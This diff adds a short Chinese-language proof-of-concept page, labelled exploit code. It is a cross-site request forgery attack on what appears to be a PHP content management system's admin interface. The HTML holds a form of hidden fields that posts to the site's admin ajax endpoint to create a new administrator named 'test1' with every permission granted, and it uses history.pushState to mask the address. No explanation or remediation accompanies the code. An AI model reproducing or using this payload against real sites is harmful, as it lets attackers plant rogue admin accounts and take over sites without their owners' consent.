@@ -1,0 +1,32 @@
+### POC实现代码如下：  
+
+> exp代码如下：  
+
+``` html
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://127.0.0.1/1.com.php/admin/ajax.php?type=admin&action=add&lang=0" method="POST">
+      <input type="hidden" name="A&#95;login" value="test1" />
+      <input type="hidden" name="A&#95;pwd" value="test1" />
+      <input type="hidden" name="A&#95;type" value="1" />
+      <input type="hidden" name="A&#95;a0" value="1" />
+      <input type="hidden" name="A&#95;a1" value="1" />
+      <input type="hidden" name="A&#95;a2" value="1" />
+      <input type="hidden" name="A&#95;a3" value="1" />
+      <input type="hidden" name="A&#95;a4" value="1" />
+      <input type="hidden" name="A&#95;a5" value="1" />
+      <input type="hidden" name="A&#95;a6" value="1" />
+      <input type="hidden" name="A&#95;a8" value="1" />
+      <input type="hidden" name="A&#95;a10" value="1" />
+      <input type="hidden" name="A&#95;a7" value="1" />
+      <input type="hidden" name="A&#95;a9" value="1" />
+      <input type="hidden" name="A&#95;a11" value="1" />
+      <input type="hidden" name="A&#95;textauth&#91;&#93;" value="all" />
+      <input type="hidden" name="A&#95;productauth&#91;&#93;" value="all" />
+      <input type="hidden" name="A&#95;bbsauth&#91;&#93;" value="all" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+```
